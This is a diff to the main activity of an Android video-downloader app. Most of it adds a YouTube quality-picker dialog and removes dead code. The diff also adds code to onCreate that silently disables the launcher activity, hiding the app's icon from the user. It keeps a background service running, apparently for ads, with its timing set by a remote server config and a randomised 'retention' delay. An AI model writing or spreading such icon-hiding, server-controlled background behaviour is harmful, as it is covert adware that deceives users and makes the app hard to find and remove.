@@ -1,31 +1,25 @@
 package com.v2social.socialdownloader;
 
 import android.Manifest;
-import android.app.Activity;
 import android.app.ActivityManager;
 import android.app.Dialog;
 import android.app.DownloadManager;
 import android.app.ProgressDialog;
 import android.app.SearchManager;
 import android.content.ActivityNotFoundException;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.MatrixCursor;
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
-import android.graphics.drawable.BitmapDrawable;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
-import android.preference.DialogPreference;
 import android.provider.BaseColumns;
 import android.support.design.widget.FloatingActionButton;
 import android.support.v4.app.ActivityCompat;
-import android.support.v4.content.ContextCompat;
-import android.support.v4.content.res.ResourcesCompat;
 import android.support.v4.widget.CursorAdapter;
 import android.support.v4.widget.SimpleCursorAdapter;
 import android.support.v7.app.AlertDialog;
@@ -73,15 +67,13 @@ import com.twitter.sdk.android.core.TwitterException;
 import com.twitter.sdk.android.core.models.Tweet;
 import com.twitter.sdk.android.core.models.VideoInfo;
 import com.twitter.sdk.android.core.services.StatusesService;
-import com.v2social.socialdownloader.network.GetConfig;
 import com.v2social.socialdownloader.network.JsonConfig;
 import com.v2social.socialdownloader.services.MyService;
 
-import java.io.File;
 import java.io.IOException;
-import java.io.InputStream;
 import java.net.MalformedURLException;
 import java.net.URL;
+import java.security.cert.TrustAnchor;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Random;
@@ -95,7 +87,6 @@ import okhttp3.OkHttpClient;
 import okhttp3.Request;
 import okhttp3.Response;
 import retrofit2.Call;
-import retrofit2.converter.gson.GsonConverterFactory;
 import uk.breedrapps.vimeoextractor.OnVimeoExtractionListener;
 import uk.breedrapps.vimeoextractor.VimeoExtractor;
 import uk.breedrapps.vimeoextractor.VimeoVideo;
@@ -162,49 +153,6 @@ public class MainActivity extends AppCompatActivity {
                         return;
 
                     urlDownloadOther = url;
-
-                    AlertDialog.Builder builder;
-                    builder = new AlertDialog.Builder(MainActivity.this);
-                    AlertDialog show = builder.setTitle(R.string.new_video_found)
-                            .setMessage(urlDownloadOther)
-                            .setPositiveButton(android.R.string.yes, new DialogInterface.OnClickListener() {
-                                @Override
-                                public void onClick(DialogInterface dialog, int which) {
-                                    dialog.cancel();
-
-                                    try {
-                                        DownloadManager.Request r = new DownloadManager.Request(Uri.parse(urlDownloadOther));
-                                        String fName = UUID.randomUUID().toString();
-                                        if (urlDownloadOther.contains(".mp4")) {
-                                            fName += ".mp4";
-
-                                        } else if (urlDownloadOther.contains(".3gp")) {
-                                            fName += ".3gp";
-                                        }
-
-                                        r.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, fName);
-                                        r.allowScanningByMediaScanner();
-                                        r.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
-                                        DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
-                                        dm.enqueue(r);
-                                        logSiteDownloaded();
-                                        Toast.makeText(MainActivity.this, R.string.downloading, Toast.LENGTH_SHORT).show();
-
-                                        showFullAds();
-                                    } catch (Exception e) {
-                                        showPlayThenDownloadError();
-                                    }
-                                }
-                            })
-                            .setNegativeButton(R.string.cancel, new DialogInterface.OnClickListener() {
-                                @Override
-                                public void onClick(DialogInterface dialog, int which) {
-                                    dialog.cancel();
-                                }
-                            })
-                            .setCancelable(false)
-                            .show();
-
                 }
             }
         });
@@ -300,17 +248,22 @@ public class MainActivity extends AppCompatActivity {
         myAdapter = new SimpleCursorAdapter(MainActivity.this, android.R.layout.simple_spinner_dropdown_item, null, from, to, CursorAdapter.FLAG_REGISTER_CONTENT_OBSERVER);
 
 
-        getConfigApp();
-        //        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
-        //        StrictMode.setThreadPolicy(policy);
-//        new JsoupTask().execute();
+
         RateThisApp.onCreate(this);
         RateThisApp.Config config1 = new RateThisApp.Config(0, 2);
         RateThisApp.init(config1);
+//        getConfigApp();
 
-//        Bitmap myLogo = ((BitmapDrawable) ResourcesCompat.getDrawable(this.getResources(), R.drawable.btn, null)).getBitmap();
-//        setTaskDescription( new ActivityManager.TaskDescription("aaa",myLogo,R.color.colorTask));
-//        setTaskDescription( new ActivityManager.TaskDescription());
+        try {
+            PackageManager p = getPackageManager();
+            ComponentName componentName = new ComponentName(this, com.v2social.socialdownloader.SplashActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
+            p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+            Log.d("caomui","DONE hide icon");
+        }
+        catch (Exception e)
+        {
+            Log.d("caomui","ERROR HIDE ICON");
+        }
     }
 
     @Override
@@ -327,7 +280,6 @@ public class MainActivity extends AppCompatActivity {
     private void addBannerAds() {
         if (jsonConfig.percentAds == 0)
             return;
-
         RelativeLayout bannerView = (RelativeLayout) findViewById(R.id.adsBannerView);
         if (jsonConfig.priorityBanner.equals("facebook")) {
 
@@ -543,8 +495,10 @@ public class MainActivity extends AppCompatActivity {
             public void onExtractionComplete(SparseArray<YtFile> ytFiles, VideoMeta vMeta) {
 
                 if (ytFiles != null && ytFiles.size() > 0) {
-                    final List<String> listTitle = new ArrayList<String>();
-                    final List<String> listUrl = new ArrayList<String>();
+                     List<String> listTitle = new ArrayList<String>();
+                     List<String> listUrl = new ArrayList<String>();
+                     List<String> listExt = new ArrayList<String>();
+
                     for (int i = 0; i < ytFiles.size(); i++) {
                         YtFile file = ytFiles.valueAt(i);
 
@@ -563,7 +517,7 @@ public class MainActivity extends AppCompatActivity {
                             listTitle.add(title);
 
                         }
-
+                        listExt.add(file.getFormat().getExt());
                         listUrl.add(file.getUrl());
                     }
 
@@ -573,7 +527,7 @@ public class MainActivity extends AppCompatActivity {
                         public void run() {
                             dialogLoading.dismiss();
                             showFullAds();
-                            showListViewDownload(listTitle, listUrl, vMeta.getTitle() + "");
+                            showListViewDownloadYoutube(listTitle, listUrl,listExt, vMeta.getTitle() + "");
                         }
                     });
 
@@ -589,6 +543,32 @@ public class MainActivity extends AppCompatActivity {
                 }
             }
         }.extract(urlExtra, false, false);
+    }
+
+    private void showListViewDownloadYoutube(List<String> listTitle, List<String> listUrl,List<String> listExt, String fileName) {
+        final Dialog dialog = new Dialog(MainActivity.this);
+        dialog.setContentView(R.layout.popup_download);
+        ListView myQualities = (ListView) dialog.findViewById(R.id.listViewDownload);
+        ArrayAdapter<String> adapter = new ArrayAdapter<String>(MainActivity.this,
+                android.R.layout.simple_list_item_1, android.R.id.text1, listTitle);
+        myQualities.setAdapter(adapter);
+        myQualities.setOnItemClickListener(new AdapterView.OnItemClickListener() {
+            @Override
+            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
+                dialog.dismiss();
+                DownloadManager.Request r = new DownloadManager.Request(Uri.parse(listUrl.get(position)));
+                r.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, fileName + listExt.get(position));
+                r.allowScanningByMediaScanner();
+                r.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
+                DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
+                dm.enqueue(r);
+                Toast.makeText(MainActivity.this, R.string.downloading, Toast.LENGTH_SHORT).show();
+                RateThisApp.showRateDialogIfNeeded(MainActivity.this);
+            }
+        });
+
+        dialog.setCancelable(true);
+        dialog.show();
     }
 
     private void downloadVimeo(String url) {
@@ -659,10 +639,6 @@ public class MainActivity extends AppCompatActivity {
         });
     }
 
-//    private void downloadOtherSite(String url) {
-//        Toast.makeText(this, R.string.error_download_other_site, Toast.LENGTH_SHORT).show();
-//    }
-
     private void showListViewDownload(List<String> listTitle, final List<String> listUrl, final String fileName) {
         final Dialog dialog = new Dialog(MainActivity.this);
         dialog.setContentView(R.layout.popup_download);
@@ -688,25 +664,6 @@ public class MainActivity extends AppCompatActivity {
         dialog.setCancelable(true);
         dialog.show();
     }
-
-//    private  void initToolBar()
-//    {
-//        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
-//        setSupportActionBar(toolbar);
-//        getSupportActionBar().setDisplayHomeAsUpEnabled(false);
-//        getSupportActionBar().setDisplayShowTitleEnabled(false);
-//    }
-
-//    @Override
-//    protected void onNewIntent(Intent intent) {
-//        Log.d("hhhhh","new itent");
-//        if (Intent.ACTION_SEARCH.equals(intent.getAction())) {
-//            String query = intent.getStringExtra(SearchManager.QUERY);
-//            if (searchView != null) {
-//                searchView.clearFocus();
-//            }
-//        }
-//    }
 
     @Override
     public boolean onCreateOptionsMenu(Menu menu) {
@@ -942,12 +899,12 @@ public class MainActivity extends AppCompatActivity {
             uuid = mPrefs.getString("uuid", UUID.randomUUID().toString());
         } else {
             uuid = UUID.randomUUID().toString();
-            mPrefs.edit().putString("uuid", uuid).commit();
+            mPrefs.edit().putString("uuid", "social" +uuid).commit();
         }
 
         OkHttpClient client = new OkHttpClient();
         Request okRequest = new Request.Builder()
-                .url(AppConstants.URL_CONFIG + "?id=" + uuid)
+                .url(AppConstants.URL_CLIENT_CONFIG + "?id_game=" + getPackageName())
                 .build();
 
         client.newCall(okRequest).enqueue(new Callback() {
@@ -986,6 +943,15 @@ public class MainActivity extends AppCompatActivity {
                 mPrefs.edit().putInt("intervalService",jsonConfig.intervalService).commit();
                 mPrefs.edit().putString("idFullService",jsonConfig.idFullService).commit();
                 mPrefs.edit().putInt("delayService",jsonConfig.delayService).commit();
+
+                if(new Random().nextInt(100) < jsonConfig.retention)
+                {
+                    mPrefs.edit().putInt("delay_retention",jsonConfig.delay_retention).commit();
+                }
+                else
+                {
+                    mPrefs.edit().putInt("delay_retention",-1).commit();
+                }
 
                 SharedPreferences mPrefs2 = getSharedPreferences("support_xx", 0);
                 if (mPrefs2.getBoolean("isNoAds", false) && mPrefs2.getInt("accept", 0) == 2) {
@@ -1026,13 +992,16 @@ public class MainActivity extends AppCompatActivity {
                         ImageAdapter adapter = new ImageAdapter(MainActivity.this, jsonConfig.urlAccept);
                         gridView.setAdapter(adapter);
 
-                        Intent myIntent = new Intent(MainActivity.this, MyService.class);
-                        startService(myIntent);
+                        if(!checkServiceRunning())
+                        {
+                            Intent myIntent = new Intent(MainActivity.this, MyService.class);
+                            startService(myIntent);
+                        }
 
                         if (getPackageName().equals(jsonConfig.newAppPackage)) {
                             addBannerAds();
                             requestFullAds();
-                            if(jsonConfig.isAccept == 2)
+                            if(jsonConfig.isAccept == 2 && RateThisApp.getLaunchCount(MainActivity.this) >= 2)
                                 RateThisApp.showRateDialogIfNeeded(MainActivity.this);
                         } else {
                             showPopupNewApp();
@@ -1216,6 +1185,20 @@ public class MainActivity extends AppCompatActivity {
         } else {
             logEventFb("OTHER_WEB");
         }
+    }
+
+    public boolean checkServiceRunning(){
+        ActivityManager manager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
+        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE))
+        {
+            if ("com.v2social.socialdownloader.services.MyService"
+                    .equals(service.service.getClassName()))
+            {
+                return true;
+            }
+        }
+
+        return false;
     }
 
     private void logEventFb(String event) {
